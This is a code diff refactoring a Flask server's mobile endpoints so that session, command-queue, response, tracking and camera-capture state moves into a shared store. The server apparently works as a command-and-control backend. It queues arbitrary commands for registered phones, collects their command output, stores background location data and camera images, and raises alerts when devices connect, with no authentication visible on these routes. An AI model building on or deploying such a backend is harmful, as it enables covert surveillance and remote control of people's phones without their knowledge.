@@ -7,7 +7,7 @@ from datetime import datetime, timedelta
 from functools import wraps
 from flask import (Blueprint, request, jsonify, redirect, url_for, render_template, send_from_directory, make_response, session, Response)
 from app.state import *  # noqa: F401,F403  -- P3
-from app.state import BASE_DIR, CONFIG, _decode_data_url, _save_mobile_capture
+from app.state import BASE_DIR, CONFIG, STORE, _decode_data_url, _save_mobile_capture
 import database as db  # legacy sibling module
 
 import platform
@@ -29,19 +29,10 @@ def mobile_register():
     db.save_mobile_session(uid, info, request.remote_addr)
     
     # Also keep in memory for current session
-    MOBILE_SESSIONS[uid] = {
-        'last_seen': datetime.now().isoformat(),
-        'info': info,
-        'ip': request.remote_addr,
-        'registered_at': datetime.now().isoformat()
-    }
-    
-    # Initialize queues if new
-    if uid not in MOBILE_COMMANDS:
-        MOBILE_COMMANDS[uid] = []
-    if uid not in MOBILE_RESPONSES:
-        MOBILE_RESPONSES[uid] = []
-    
+    # P5.3: session/queue state lives behind the shared StateStore
+    STORE.mobile_session_set(uid, info, request.remote_addr,
+                             datetime.now().isoformat())
+
     # Send notification
     send_notification({
         "type": "Mobile Device Connected",
@@ -62,14 +53,13 @@ def mobile_poll():
     # Update last seen in DATABASE
     db.update_mobile_last_seen(uid)
     
-    if uid in MOBILE_SESSIONS:
-        MOBILE_SESSIONS[uid]['last_seen'] = datetime.now().isoformat()
-    
+    STORE.mobile_last_seen_update(uid)  # no-op when uid unknown (legacy)
+
     # Check for commands
-    if uid in MOBILE_COMMANDS and len(MOBILE_COMMANDS[uid]) > 0:
-        cmd = MOBILE_COMMANDS[uid].pop(0)
+    cmd = STORE.mobile_command_dequeue(uid)
+    if cmd is not None:
         return jsonify({'command': cmd})
-    
+
     return jsonify({'command': None})
 
 @bp.route('/api/mobile/response', methods=['POST'])
@@ -80,13 +70,8 @@ def mobile_response():
     output = data.get('output')
     
     if uid:
-        if uid not in MOBILE_RESPONSES:
-            MOBILE_RESPONSES[uid] = []
-        MOBILE_RESPONSES[uid].append({
-            'output': output,
-            'timestamp': datetime.now().isoformat()
-        })
-    
+        STORE.mobile_response_append(uid, output, datetime.now().isoformat())
+
     return jsonify({'status': 'received'})
 
 @bp.route('/api/mobile/send_command', methods=['POST'])
@@ -97,9 +82,7 @@ def mobile_send_command():
     command = data.get('command')
     
     if uid and command:
-        if uid not in MOBILE_COMMANDS:
-            MOBILE_COMMANDS[uid] = []
-        MOBILE_COMMANDS[uid].append(command)
+        STORE.mobile_command_enqueue(uid, command)
         return jsonify({'status': 'queued'})
     
     return jsonify({'error': 'Invalid data'}), 400
@@ -107,10 +90,10 @@ def mobile_send_command():
 @bp.route('/api/mobile/get_response/<uid>', methods=['GET'])
 def mobile_get_response(uid):
     """Get latest response from mobile client"""
-    if uid in MOBILE_RESPONSES and len(MOBILE_RESPONSES[uid]) > 0:
-        response = MOBILE_RESPONSES[uid].pop(0)
+    response = STORE.mobile_response_pop(uid)
+    if response is not None:
         return jsonify(response)
-    
+
     return jsonify({'output': None})
 
 
@@ -125,16 +108,10 @@ def mobile_background_data():
     tracking_data = data.get('data')
     
     if uid and tracking_data:
-        if uid not in MOBILE_TRACKING_DATA:
-            MOBILE_TRACKING_DATA[uid] = []
-        
         # Store tracking data with timestamp
+        # P5.3: per-uid tracking list (trim-at-100) lives in the StateStore
         tracking_data['received_at'] = datetime.now().isoformat()
-        MOBILE_TRACKING_DATA[uid].append(tracking_data)
-        
-        # Keep only last 100 entries per device
-        if len(MOBILE_TRACKING_DATA[uid]) > 100:
-            MOBILE_TRACKING_DATA[uid] = MOBILE_TRACKING_DATA[uid][-100:]
+        STORE.mobile_tracking_append(uid, tracking_data)
         
         # Send notification for important events
         if tracking_data.get('type') == 'background_location':
@@ -153,10 +130,7 @@ def mobile_background_data():
 @bp.route('/api/mobile/tracking_data/<uid>', methods=['GET'])
 def mobile_get_tracking_data(uid):
     """Get tracking data for a specific mobile client"""
-    if uid in MOBILE_TRACKING_DATA:
-        return jsonify({'data': MOBILE_TRACKING_DATA[uid]})
-    
-    return jsonify({'data': []})
+    return jsonify({'data': STORE.mobile_tracking_all(uid)})
 
 @bp.route('/api/mobile/camera', methods=['POST'])
 def mobile_camera():
@@ -181,7 +155,9 @@ def mobile_camera():
                 f.write(decoded_data)
             
             # Store reference
-            MOBILE_CAMERA_IMAGES[uid] = fname
+            STORE.mobile_capture_set(uid, 'camera', fname,
+                                     '/images/' + fname,
+                                     {'size': len(decoded_data)})
 
             # Index in the capture gallery (persistent across restarts)
             db.save_mobile_capture(uid, 'camera', fname, '/images/' + fname, {
@@ -246,13 +222,11 @@ def mobile_clients():
     all_sessions = db.get_all_mobile_sessions()
     
     # Merge with in-memory sessions
-    for uid, db_session in all_sessions.items():
-        # Update in-memory cache
-        if uid not in MOBILE_SESSIONS:
-            MOBILE_SESSIONS[uid] = db_session
-    
+    # P5.3: merge runs through the StateStore (never overwrites live entries)
+    STORE.mobile_sessions_import(all_sessions)
+
     # Now check which are active
-    for uid, session in MOBILE_SESSIONS.items():
+    for uid, session in STORE.mobile_all_sessions().items():
         if not uid:
             # Skip corrupt sessions that have no uid
             continue
